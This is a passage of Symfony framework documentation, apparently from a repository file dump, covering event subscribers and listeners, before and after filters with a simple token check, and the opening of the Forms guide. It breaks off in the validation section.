:doc:`/components/event_dispatcher`.\n\nThe following example shows an event subscriber that defines several methods which\nlisten to the same ``kernel.exception`` event::\n\n    // src/EventSubscriber/ExceptionSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent;\n    use Symfony\\Component\\HttpKernel\\KernelEvents;\n\n    class ExceptionSubscriber implements EventSubscriberInterface\n    {\n        public static function getSubscribedEvents(): array\n        {\n            // return the subscribed events, their methods and priorities\n            return [\n                KernelEvents::EXCEPTION => [\n                    ['processException', 10],\n                    ['logException', 0],\n                    ['notifyException', -10],\n                ],\n            ];\n        }\n\n        public function processException(ExceptionEvent $event): void\n        {\n            // ...\n        }\n\n        public function logException(ExceptionEvent $event): void\n        {\n            // ...\n        }\n\n        public function notifyException(ExceptionEvent $event): void\n        {\n            // ...\n        }\n    }\n\nThat's it! Your ``services.yaml`` file should already be setup to load services from\nthe ``EventSubscriber`` directory. Symfony takes care of the rest.\n\n.. _ref-event-subscriber-configuration:\n\n.. tip::\n\n    If your methods are *not* called when an exception is thrown, double-check that\n    you're :ref:`loading services <service-container-services-load-example>` from\n    the ``EventSubscriber`` directory and have :ref:`autoconfigure <services-autoconfigure>`\n    enabled. You can also manually add the ``kernel.event_subscriber`` tag.\n\nRequest Events, Checking Types\n------------------------------\n\nA single page can make several requests (one main request, and then multiple\nsub-requests - typically when :ref:`embedding controllers in templates <templates-embed-controllers>`).\nFor the core Symfony events, you might need to check to see if the event is for\na \"main\" request or a \"sub request\"::\n\n    // src/EventListener/RequestListener.php\n    namespace App\\EventListener;\n\n    use Symfony\\Component\\HttpKernel\\Event\\RequestEvent;\n\n    class RequestListener\n    {\n        public function onKernelRequest(RequestEvent $event): void\n        {\n            if (!$event->isMainRequest()) {\n                // don't do anything if it's not the main request\n                return;\n            }\n\n            // ...\n        }\n    }\n\nCertain things, like checking information on the *real* request, may not need to\nbe done on the sub-request listeners.\n\n.. _events-or-subscribers:\n\nListeners or Subscribers\n------------------------\n\nListeners and subscribers can be used in the same application indistinctly. The\ndecision to use either of them is usually a matter of personal taste. However,\nthere are some minor advantages for each of them:\n\n* **Subscribers are easier to reuse** because the knowledge of the events is kept\n  in the class rather than in the service definition. This is the reason why\n  Symfony uses subscribers internally;\n* **Listeners are more flexible** because bundles can enable or disable each of\n  them conditionally depending on some configuration value.\n\nEvent Aliases\n-------------\n\nWhen configuring event listeners and subscribers via dependency injection,\nSymfony's core events can also be referred to by the fully qualified class\nname (FQCN) of the corresponding event class::\n\n    // src/EventSubscriber/RequestSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\HttpKernel\\Event\\RequestEvent;\n\n    class RequestSubscriber implements EventSubscriberInterface\n    {\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                RequestEvent::class => 'onKernelRequest',\n            ];\n        }\n\n        public function onKernelRequest(RequestEvent $event): void\n        {\n            // ...\n        }\n    }\n\nInternally, the event FQCN are treated as aliases for the original event names.\nSince the mapping already happens when compiling the service container, event\nlisteners and subscribers using FQCN instead of event names will appear under\nthe original event name when inspecting the event dispatcher.\n\nThis alias mapping can be extended for custom events by registering the\ncompiler pass ``AddEventAliasesPass``::\n\n    // src/Kernel.php\n    namespace App;\n\n    use App\\Event\\MyCustomEvent;\n    use Symfony\\Component\\DependencyInjection\\ContainerBuilder;\n    use Symfony\\Component\\EventDispatcher\\DependencyInjection\\AddEventAliasesPass;\n    use Symfony\\Component\\HttpKernel\\Kernel as BaseKernel;\n\n    class Kernel extends BaseKernel\n    {\n        protected function build(ContainerBuilder $container): void\n        {\n            $container->addCompilerPass(new AddEventAliasesPass([\n                MyCustomEvent::class => 'my_custom_event',\n            ]));\n        }\n    }\n\nThe compiler pass will always extend the existing list of aliases. Because of\nthat, it is safe to register multiple instances of the pass with different\nconfigurations.\n\nDebugging Event Listeners\n-------------------------\n\nYou can find out what listeners are registered in the event dispatcher\nusing the console. To show all events and their listeners, run:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher\n\nYou can get registered listeners for a particular event by specifying\nits name:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher kernel.exception\n\nor can get everything which partial matches the event name:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher kernel // matches \"kernel.exception\", \"kernel.response\" etc.\n    $ php bin/console debug:event-dispatcher Security // matches \"Symfony\\Component\\Security\\Http\\Event\\CheckPassportEvent\"\n\nThe :doc:`security </security>` system uses an event dispatcher per\nfirewall. Use the ``--dispatcher`` option to get the registered listeners\nfor a particular event dispatcher:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher --dispatcher=security.event_dispatcher.main\n\n.. _event-dispatcher-before-after-filters:\n\nHow to Set Up Before and After Filters\n--------------------------------------\n\nIt is quite common in web application development to need some logic to be\nperformed right before or directly after your controller actions acting as\nfilters or hooks.\n\nSome web frameworks define methods like ``preExecute()`` and ``postExecute()``,\nbut there is no such thing in Symfony. The good news is that there is a much\nbetter way to interfere with the Request -> Response process using the\n:doc:`EventDispatcher component </components/event_dispatcher>`.\n\nToken Validation Example\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nImagine that you need to develop an API where some controllers are public\nbut some others are restricted to one or some clients. For these private features,\nyou might provide a token to your clients to identify themselves.\n\nSo, before executing your controller action, you need to check if the action\nis restricted or not. If it is restricted, you need to validate the provided\ntoken.\n\n.. note::\n\n    Please note that for simplicity in this recipe, tokens will be defined\n    in config and neither database setup nor authentication via the Security\n    component will be used.\n\nBefore Filters with the ``kernel.controller`` Event\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nFirst, define some token configuration as parameters:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        parameters:\n            tokens:\n                client1: pass1\n                client2: pass2\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <parameters>\n                <parameter key=\"tokens\" type=\"collection\">\n                    <parameter key=\"client1\">pass1</parameter>\n                    <parameter key=\"client2\">pass2</parameter>\n                </parameter>\n            </parameters>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        $container->setParameter('tokens', [\n            'client1' => 'pass1',\n            'client2' => 'pass2',\n        ]);\n\nTag Controllers to Be Checked\n.............................\n\nA ``kernel.controller`` (aka ``KernelEvents::CONTROLLER``) listener gets notified\non *every* request, right before the controller is executed. So, first, you need\nsome way to identify if the controller that matches the request needs token validation.\n\nA clean and easy way is to create an empty interface and make the controllers\nimplement it::\n\n    namespace App\\Controller;\n\n    interface TokenAuthenticatedController\n    {\n        // ...\n    }\n\nA controller that implements this interface looks like this::\n\n    namespace App\\Controller;\n\n    use App\\Controller\\TokenAuthenticatedController;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class FooController extends AbstractController implements TokenAuthenticatedController\n    {\n        // An action that needs authentication\n        public function bar(): Response\n        {\n            // ...\n        }\n    }\n\nCreating an Event Subscriber\n............................\n\nNext, you'll need to create an event subscriber, which will hold the logic\nthat you want to be executed before your controllers. If you're not familiar with\nevent subscribers, you can learn more about them at :doc:`/event_dispatcher`::\n\n    // src/EventSubscriber/TokenSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use App\\Controller\\TokenAuthenticatedController;\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\HttpKernel\\Event\\ControllerEvent;\n    use Symfony\\Component\\HttpKernel\\Exception\\AccessDeniedHttpException;\n    use Symfony\\Component\\HttpKernel\\KernelEvents;\n\n    class TokenSubscriber implements EventSubscriberInterface\n    {\n        public function __construct(\n            private array $tokens\n        ) {\n        }\n\n        public function onKernelController(ControllerEvent $event): void\n        {\n            $controller = $event->getController();\n\n            // when a controller class defines multiple action methods, the controller\n            // is returned as [$controllerInstance, 'methodName']\n            if (is_array($controller)) {\n                $controller = $controller[0];\n            }\n\n            if ($controller instanceof TokenAuthenticatedController) {\n                $token = $event->getRequest()->query->get('token');\n                if (!in_array($token, $this->tokens)) {\n                    throw new AccessDeniedHttpException('This action needs a valid token!');\n                }\n            }\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                KernelEvents::CONTROLLER => 'onKernelController',\n            ];\n        }\n    }\n\nThat's it! Your ``services.yaml`` file should already be setup to load services from\nthe ``EventSubscriber`` directory. Symfony takes care of the rest. Your\n``TokenSubscriber`` ``onKernelController()`` method will be executed on each request.\nIf the controller that is about to be executed implements ``TokenAuthenticatedController``,\ntoken authentication is applied. This lets you have a \"before\" filter on any controller\nyou want.\n\n.. tip::\n\n    If your subscriber is *not* called on each request, double-check that\n    you're :ref:`loading services <service-container-services-load-example>` from\n    the ``EventSubscriber`` directory and have :ref:`autoconfigure <services-autoconfigure>`\n    enabled. You can also manually add the ``kernel.event_subscriber`` tag.\n\nAfter Filters with the ``kernel.response`` Event\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn addition to having a \"hook\" that's executed *before* your controller, you\ncan also add a hook that's executed *after* your controller. For this example,\nimagine that you want to add a ``sha1`` hash (with a salt using that token) to\nall responses that have passed this token authentication.\n\nAnother core Symfony event - called ``kernel.response`` (aka ``KernelEvents::RESPONSE``) -\nis notified on every request, but after the controller returns a Response object.\nTo create an \"after\" listener, create a listener class and register\nit as a service on this event.\n\nFor example, take the ``TokenSubscriber`` from the previous example and first\nrecord the authentication token inside the request attributes. This will\nserve as a basic flag that this request underwent token authentication::\n\n    public function onKernelController(ControllerEvent $event): void\n    {\n        // ...\n\n        if ($controller instanceof TokenAuthenticatedController) {\n            $token = $event->getRequest()->query->get('token');\n            if (!in_array($token, $this->tokens)) {\n                throw new AccessDeniedHttpException('This action needs a valid token!');\n            }\n\n            // mark the request as having passed token authentication\n            $event->getRequest()->attributes->set('auth_token', $token);\n        }\n    }\n\nNow, configure the subscriber to listen to another event and add ``onKernelResponse()``.\nThis will look for the ``auth_token`` flag on the request object and set a custom\nheader on the response if it's found::\n\n    // add the new use statement at the top of your file\n    use Symfony\\Component\\HttpKernel\\Event\\ResponseEvent;\n\n    public function onKernelResponse(ResponseEvent $event): void\n    {\n        // check to see if onKernelController marked this as a token \"auth'ed\" request\n        if (!$token = $event->getRequest()->attributes->get('auth_token')) {\n            return;\n        }\n\n        $response = $event->getResponse();\n\n        // create a hash and set it as a response header\n        $hash = sha1($response->getContent().$token);\n        $response->headers->set('X-CONTENT-HASH', $hash);\n    }\n\n    public static function getSubscribedEvents(): array\n    {\n        return [\n            KernelEvents::CONTROLLER => 'onKernelController',\n            KernelEvents::RESPONSE => 'onKernelResponse',\n        ];\n    }\n\nThat's it! The ``TokenSubscriber`` is now notified before every controller is\nexecuted (``onKernelController()``) and after every controller returns a response\n(``onKernelResponse()``). By making specific controllers implement the ``TokenAuthenticatedController``\ninterface, your listener knows which controllers it should take action on.\nAnd by storing a value in the request's \"attributes\" bag, the ``onKernelResponse()``\nmethod knows to add the extra header. Have fun!\n\n.. _event-dispatcher-method-behavior:\n\nHow to Customize a Method Behavior without Using Inheritance\n------------------------------------------------------------\n\nIf you want to do something right before, or directly after a method is\ncalled, you can dispatch an event respectively at the beginning or at the\nend of the method::\n\n    class CustomMailer\n    {\n        // ...\n\n        public function send(string $subject, string $message): mixed\n        {\n            // dispatch an event before the method\n            $event = new BeforeSendMailEvent($subject, $message);\n            $this->dispatcher->dispatch($event, 'mailer.pre_send');\n\n            // get $subject and $message from the event, they may have been modified\n            $subject = $event->getSubject();\n            $message = $event->getMessage();\n\n            // the real method implementation is here\n            $returnValue = ...;\n\n            // do something after the method\n            $event = new AfterSendMailEvent($returnValue);\n            $this->dispatcher->dispatch($event, 'mailer.post_send');\n\n            return $event->getReturnValue();\n        }\n    }\n\nIn this example, two events are dispatched:\n\n#. ``mailer.pre_send``, before the method is called,\n#. and ``mailer.post_send`` after the method is called.\n\nEach uses a custom Event class to communicate information to the listeners\nof the two events. For example, ``BeforeSendMailEvent`` might look like\nthis::\n\n    // src/Event/BeforeSendMailEvent.php\n    namespace App\\Event;\n\n    use Symfony\\Contracts\\EventDispatcher\\Event;\n\n    class BeforeSendMailEvent extends Event\n    {\n        public function __construct(\n            private string $subject,\n            private string $message,\n        ) {\n        }\n\n        public function getSubject(): string\n        {\n            return $this->subject;\n        }\n\n        public function setSubject(string $subject): string\n        {\n            $this->subject = $subject;\n        }\n\n        public function getMessage(): string\n        {\n            return $this->message;\n        }\n\n        public function setMessage(string $message): void\n        {\n            $this->message = $message;\n        }\n    }\n\nAnd the ``AfterSendMailEvent`` even like this::\n\n    // src/Event/AfterSendMailEvent.php\n    namespace App\\Event;\n\n    use Symfony\\Contracts\\EventDispatcher\\Event;\n\n    class AfterSendMailEvent extends Event\n    {\n        public function __construct(\n            private mixed $returnValue,\n        ) {\n        }\n\n        public function getReturnValue(): mixed\n        {\n            return $this->returnValue;\n        }\n\n        public function setReturnValue(mixed $returnValue): void\n        {\n            $this->returnValue = $returnValue;\n        }\n    }\n\nBoth events allow you to get some information (e.g. ``getMessage()``) and even change\nthat information (e.g. ``setMessage()``).\n\nNow, you can create an event subscriber to hook into this event. For example, you\ncould listen to the ``mailer.post_send`` event and change the method's return value::\n\n    // src/EventSubscriber/MailPostSendSubscriber.php\n    namespace App\\EventSubscriber;\n\n    use App\\Event\\AfterSendMailEvent;\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n\n    class MailPostSendSubscriber implements EventSubscriberInterface\n    {\n        public function onMailerPostSend(AfterSendMailEvent $event): void\n        {\n            $returnValue = $event->getReturnValue();\n            // modify the original $returnValue value\n\n            $event->setReturnValue($returnValue);\n        }\n\n        public static function getSubscribedEvents(): array\n        {\n            return [\n                'mailer.post_send' => 'onMailerPostSend',\n            ];\n        }\n    }\n\nThat's it! Your subscriber should be called automatically (or read more about\n:ref:`event subscriber configuration <ref-event-subscriber-configuration>`).\n\nLearn More\n----------\n\n- :ref:`The Request-Response Lifecycle <the-workflow-of-a-request>`\n- :doc:`/reference/events`\n- :ref:`Security-related Events <security-security-events>`\n- :doc:`/components/event_dispatcher`\n"
        },
        {
          "name": "form",
          "type": "tree",
          "content": null
        },
        {
          "name": "forms.rst",
          "type": "blob",
          "size": 34.1396484375,
          "content": "Forms\n=====\n\n.. admonition:: Screencast\n    :class: screencast\n\n    Do you prefer video tutorials? Check out the `Symfony Forms screencast series`_.\n\nCreating and processing HTML forms is hard and repetitive. You need to deal with\nrendering HTML form fields, validating submitted data, mapping the form data\ninto objects and a lot more. Symfony includes a powerful form feature that\nprovides all these features and many more for truly complex scenarios.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall the form feature before using it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/form\n\nUsage\n-----\n\nThe recommended workflow when working with Symfony forms is the following:\n\n#. **Build the form** in a Symfony controller or using a dedicated form class;\n#. **Render the form** in a template so the user can edit and submit it;\n#. **Process the form** to validate the submitted data, transform it into PHP\n   data and do something with it (e.g. persist it in a database).\n\nEach of these steps is explained in detail in the next sections. To make\nexamples easier to follow, all of them assume that you're building a small Todo\nlist application that displays \"tasks\".\n\nUsers create and edit tasks using Symfony forms. Each task is an instance of the\nfollowing ``Task`` class::\n\n    // src/Entity/Task.php\n    namespace App\\Entity;\n\n    class Task\n    {\n        protected string $task;\n\n        protected ?\\DateTimeInterface $dueDate;\n\n        public function getTask(): string\n        {\n            return $this->task;\n        }\n\n        public function setTask(string $task): void\n        {\n            $this->task = $task;\n        }\n\n        public function getDueDate(): ?\\DateTimeInterface\n        {\n            return $this->dueDate;\n        }\n\n        public function setDueDate(?\\DateTimeInterface $dueDate): void\n        {\n            $this->dueDate = $dueDate;\n        }\n    }\n\nThis class is a \"plain-old-PHP-object\" because, so far, it has nothing to do\nwith Symfony or any other library. It's a normal PHP object that directly solves\na problem inside *your* application (i.e. the need to represent a task in your\napplication). But you can also edit :doc:`Doctrine entities </doctrine>` in the\nsame way.\n\n.. _form-types:\n\nForm Types\n~~~~~~~~~~\n\nBefore creating your first Symfony form, it's important to understand the\nconcept of \"form type\". In other projects, it's common to differentiate between\n\"forms\" and \"form fields\". In Symfony, all of them are \"form types\":\n\n* a single ``<input type=\"text\">`` form field is a \"form type\" (e.g. ``TextType``);\n* a group of several HTML fields used to input a postal address is a \"form type\"\n  (e.g. ``PostalAddressType``);\n* an entire ``<form>`` with multiple fields to edit a user profile is a\n  \"form type\" (e.g. ``UserProfileType``).\n\nThis may be confusing at first, but it will feel natural to you soon enough.\nBesides, it simplifies code and makes \"composing\" and \"embedding\" form fields\nmuch easier to implement.\n\nThere are tens of :doc:`form types provided by Symfony </reference/forms/types>`\nand you can also :doc:`create your own form types </form/create_custom_field_type>`.\n\n.. tip::\n\n    You can use the ``debug:form`` to list all the available types, type\n    extensions and type guessers in your application:\n\n    .. code-block:: terminal\n\n        $ php bin/console debug:form\n\n        # pass the form type FQCN to only show the options for that type, its parents and extensions.\n        # For built-in types, you can pass the short classname instead of the FQCN\n        $ php bin/console debug:form BirthdayType\n\n        # pass also an option name to only display the full definition of that option\n        $ php bin/console debug:form BirthdayType label_attr\n\nBuilding Forms\n--------------\n\nSymfony provides a \"form builder\" object which allows you to describe the form\nfields using a fluent interface. Later, this builder creates the actual form\nobject used to render and process contents.\n\n.. _creating-forms-in-controllers:\n\nCreating Forms in Controllers\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your controller extends from the :ref:`AbstractController <the-base-controller-class-services>`,\nuse the ``createFormBuilder()`` helper::\n\n    // src/Controller/TaskController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\Task;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\DateType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\SubmitType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\TextType;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class TaskController extends AbstractController\n    {\n        public function new(Request $request): Response\n        {\n            // creates a task object and initializes some data for this example\n            $task = new Task();\n            $task->setTask('Write a blog post');\n            $task->setDueDate(new \\DateTimeImmutable('tomorrow'));\n\n            $form = $this->createFormBuilder($task)\n                ->add('task', TextType::class)\n                ->add('dueDate', DateType::class)\n                ->add('save', SubmitType::class, ['label' => 'Create Task'])\n                ->getForm();\n\n            // ...\n        }\n    }\n\nIf your controller does not extend from ``AbstractController``, you'll need to\n:ref:`fetch services in your controller <controller-accessing-services>` and\nuse the ``createBuilder()`` method of the ``form.factory`` service.\n\nIn this example, you've added two fields to your form - ``task`` and ``dueDate``\n- corresponding to the ``task`` and ``dueDate`` properties of the ``Task``\nclass. You've also assigned each a :ref:`form type <form-types>` (e.g. ``TextType``\nand ``DateType``), represented by its fully qualified class name. Finally, you\nadded a submit button with a custom label for submitting the form to the server.\n\n.. _creating-forms-in-classes:\n\nCreating Form Classes\n~~~~~~~~~~~~~~~~~~~~~\n\nSymfony recommends putting as little logic as possible in controllers. That's why\nit's better to move complex forms to dedicated classes instead of defining them\nin controller actions. Besides, forms defined in classes can be reused in\nmultiple actions and services.\n\nForm classes are :ref:`form types <form-types>` that implement\n:class:`Symfony\\\\Component\\\\Form\\\\FormTypeInterface`. However, it's better to\nextend from :class:`Symfony\\\\Component\\\\Form\\\\AbstractType`, which already\nimplements the interface and provides some utilities::\n\n    // src/Form/Type/TaskType.php\n    namespace App\\Form\\Type;\n\n    use Symfony\\Component\\Form\\AbstractType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\DateType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\SubmitType;\n    use Symfony\\Component\\Form\\Extension\\Core\\Type\\TextType;\n    use Symfony\\Component\\Form\\FormBuilderInterface;\n\n    class TaskType extends AbstractType\n    {\n        public function buildForm(FormBuilderInterface $builder, array $options): void\n        {\n            $builder\n                ->add('task', TextType::class)\n                ->add('dueDate', DateType::class)\n                ->add('save', SubmitType::class)\n            ;\n        }\n    }\n\n.. tip::\n\n    Install the `MakerBundle`_ in your project to generate form classes using\n    the ``make:form`` and ``make:registration-form`` commands.\n\nThe form class contains all the directions needed to create the task form. In\ncontrollers extending from the :ref:`AbstractController <the-base-controller-class-services>`,\nuse the ``createForm()`` helper (otherwise, use the ``create()`` method of the\n``form.factory`` service)::\n\n    // src/Controller/TaskController.php\n    namespace App\\Controller;\n\n    use App\\Form\\Type\\TaskType;\n    // ...\n\n    class TaskController extends AbstractController\n    {\n        public function new(): Response\n        {\n            // creates a task object and initializes some data for this example\n            $task = new Task();\n            $task->setTask('Write a blog post');\n            $task->setDueDate(new \\DateTimeImmutable('tomorrow'));\n\n            $form = $this->createForm(TaskType::class, $task);\n\n            // ...\n        }\n    }\n\n.. _form-data-class:\n\nEvery form needs to know the name of the class that holds the underlying data\n(e.g. ``App\\Entity\\Task``). Usually, this is just guessed based off of the\nobject passed to the second argument to ``createForm()`` (i.e. ``$task``).\nLater, when you begin :doc:`embedding forms </form/embedded>`, this will no\nlonger be sufficient.\n\nSo, while not always necessary, it's generally a good idea to explicitly specify\nthe ``data_class`` option by adding the following to your form type class::\n\n    // src/Form/Type/TaskType.php\n    namespace App\\Form\\Type;\n\n    use App\\Entity\\Task;\n    use Symfony\\Component\\OptionsResolver\\OptionsResolver;\n    // ...\n\n    class TaskType extends AbstractType\n    {\n        // ...\n\n        public function configureOptions(OptionsResolver $resolver): void\n        {\n            $resolver->setDefaults([\n                'data_class' => Task::class,\n            ]);\n        }\n    }\n\n.. _rendering-forms:\n\nRendering Forms\n---------------\n\nNow that the form has been created, the next step is to render it::\n\n    // src/Controller/TaskController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\Task;\n    use App\\Form\\Type\\TaskType;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    class TaskController extends AbstractController\n    {\n        public function new(Request $request): Response\n        {\n            $task = new Task();\n            // ...\n\n            $form = $this->createForm(TaskType::class, $task);\n\n            return $this->render('task/new.html.twig', [\n                'form' => $form,\n            ]);\n        }\n    }\n\nInternally, the ``render()`` method calls ``$form->createView()`` to\ntransform the form into a *form view* instance.\n\nThen, use some :ref:`form helper functions <reference-form-twig-functions>` to\nrender the form contents:\n\n.. code-block:: twig\n\n    {# templates/task/new.html.twig #}\n    {{ form(form) }}\n\nThat's it! The :ref:`form() function <reference-forms-twig-form>` renders all\nfields *and* the ``<form>`` start and end tags. By default, the form method is\n``POST`` and the target URL is the same that displayed the form, but\n:ref:`you can change both <forms-change-action-method>`.\n\nNotice how the rendered ``task`` input field has the value of the ``task``\nproperty from the ``$task`` object (i.e. \"Write a blog post\"). This is the first\njob of a form: to take data from an object and translate it into a format that's\nsuitable for being rendered in an HTML form.\n\n.. tip::\n\n    The form system is smart enough to access the value of the protected\n    ``task`` property via the ``getTask()`` and ``setTask()`` methods on the\n    ``Task`` class. Unless a property is public, it *must* have a \"getter\" and\n    \"setter\" method so that Symfony can get and put data onto the property. For\n    a boolean property, you can use an \"isser\" or \"hasser\" method (e.g.\n    ``isPublished()`` or ``hasReminder()``) instead of a getter (e.g.\n    ``getPublished()`` or ``getReminder()``).\n\nAs short as this rendering is, it's not very flexible. Usually, you'll need more\ncontrol about how the entire form or some of its fields look. For example, thanks\nto the :doc:`Bootstrap 5 integration with Symfony forms </form/bootstrap5>` you\ncan set this option to generate forms compatible with the Bootstrap 5 CSS framework:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/twig.yaml\n        twig:\n            form_themes: ['bootstrap_5_layout.html.twig']\n\n    .. code-block:: xml\n\n        <!-- config/packages/twig.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:twig=\"http://symfony.com/schema/dic/twig\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/twig\n                https://symfony.com/schema/dic/twig/twig-1.0.xsd\">\n\n            <twig:config>\n                <twig:form-theme>bootstrap_5_layout.html.twig</twig:form-theme>\n                <!-- ... -->\n            </twig:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/twig.php\n        use Symfony\\Config\\TwigConfig;\n\n        return static function (TwigConfig $twig): void {\n            $twig->formThemes(['bootstrap_5_layout.html.twig']);\n\n            // ...\n        };\n\nThe :ref:`built-in Symfony form themes <symfony-builtin-forms>` include\nBootstrap 3, 4 and 5, Foundation 5 and 6, as well as Tailwind 2. You can also\n:ref:`create your own Symfony form theme <create-your-own-form-theme>`.\n\nIn addition to form themes, Symfony allows you to\n:doc:`customize the way fields are rendered </form/form_customization>` with\nmultiple functions to render each field part separately (widgets, labels,\nerrors, help messages, etc.)\n\n.. _processing-forms:\n\nProcessing Forms\n----------------\n\nThe :ref:`recommended way of processing forms <best-practice-handle-form>` is to\nuse a single action for both rendering the form and handling the form submit.\nYou can use separate actions, but using one action simplifies everything while\nkeeping the code concise and maintainable.\n\nProcessing a form means to translate user-submitted data back to the properties\nof an object. To make this happen, the submitted data from the user must be\nwritten into the form object::\n\n    // src/Controller/TaskController.php\n\n    // ...\n    use Symfony\\Component\\HttpFoundation\\Request;\n\n    class TaskController extends AbstractController\n    {\n        public function new(Request $request): Response\n        {\n            // just set up a fresh $task object (remove the example data)\n            $task = new Task();\n\n            $form = $this->createForm(TaskType::class, $task);\n\n            $form->handleRequest($request);\n            if ($form->isSubmitted() && $form->isValid()) {\n                // $form->getData() holds the submitted values\n                // but, the original `$task` variable has also been updated\n                $task = $form->getData();\n\n                // ... perform some action, such as saving the task to the database\n\n                return $this->redirectToRoute('task_success');\n            }\n\n            return $this->render('task/new.html.twig', [\n                'form' => $form,\n            ]);\n        }\n    }\n\nThis controller follows a common pattern for handling forms and has three\npossible paths:\n\n#. When initially loading the page in a browser, the form hasn't been submitted\n   yet and ``$form->isSubmitted()`` returns ``false``. So, the form is created\n   and rendered;\n\n#. When the user submits the form, :method:`Symfony\\\\Component\\\\Form\\\\FormInterface::handleRequest`\n   recognizes this and immediately writes the submitted data back into the\n   ``task`` and ``dueDate`` properties of the ``$task`` object. Then this object\n   is validated (validation is explained in the next section). If it is invalid,\n   :method:`Symfony\\\\Component\\\\Form\\\\FormInterface::isValid` returns\n   ``false`` and the form is rendered again, but now with validation errors.\n\n   By passing ``$form`` to the ``render()`` method (instead of\n   ``$form->createView()``), the response code is automatically set to\n   `HTTP 422 Unprocessable Content`_. This ensures compatibility with tools\n   relying on the HTTP specification, like `Symfony UX Turbo`_;\n\n#. When the user submits the form with valid data, the submitted data is again\n   written into the form, but this time :method:`Symfony\\\\Component\\\\Form\\\\FormInterface::isValid`\n   returns ``true``. Now you have the opportunity to perform some actions using\n   the ``$task`` object (e.g. persisting it to the database) before redirecting\n   the user to some other page (e.g. a \"thank you\" or \"success\" page);\n\n.. note::\n\n    Redirecting a user after a successful form submission is a best practice\n    that prevents the user from being able to hit the \"Refresh\" button of\n    their browser and re-post the data.\n\n.. seealso::\n\n    If you need more control over exactly when your form is submitted or which\n    data is passed to it, you can\n    :doc:`use the submit() method to handle form submissions </form/direct_submit>`.\n\n.. _validating-forms:\n\nValidating Forms\n----------------\n\nIn the previous section, you learned how a form can be submitted with valid\nor invalid data. In Symfony, the question isn't whether the \"form\" is valid, but\nwhether or not the underlying object (``$task`` in this example) is valid after\nthe form has applied the submitted data to it. Calling ``$form->isValid()`` is a\nshortcut that asks the ``$task`` object whether or not it has valid data.\n\nBefore using validation, add support for it in your application:\n\n.. code-block:: terminal\n\n    $ composer require symfony/validator\n\nValidation is done by adding a set of rules, called (validation) constraints,\nto a class. You can add them either to the entity class or by using the\n:ref:`constraints option <reference-form-option-constraints>` of form types.\n\nTo see the first approach - adding constraints to the entity - in action,\nadd the validation constraints, so that the ``task`` field cannot be empty,\nand the ``dueDate`` field cannot be empty, and must be a valid ``DateTimeImmutable``\nobject.\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Entity/Task.php\n        namespace App\\Entity;\n\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n\n        class Task\n        {\n            #[Assert\\NotBlank]\n            public string $task;\n\n            #[Assert\\NotBlank]\n            #[Assert\\Type(\\DateTimeInterface::class)]\n            protected \\DateTimeInterface $dueDate;\n        }\n\n    .. code-block:: yaml\n\n        # config/validator/validation.yaml\n        App\\Entity\\Task:\n            properties:\n                task:\n                    - NotBlank: ~\n                dueDate:\n                    - NotBlank: ~\n                    - Type: \\DateTimeInterface\n\n    .. code-block:: xml\n\n        <!-- config/validator/validation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <constraint-mapping xmlns=\"http://symfony.com/schema/dic/constraint-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            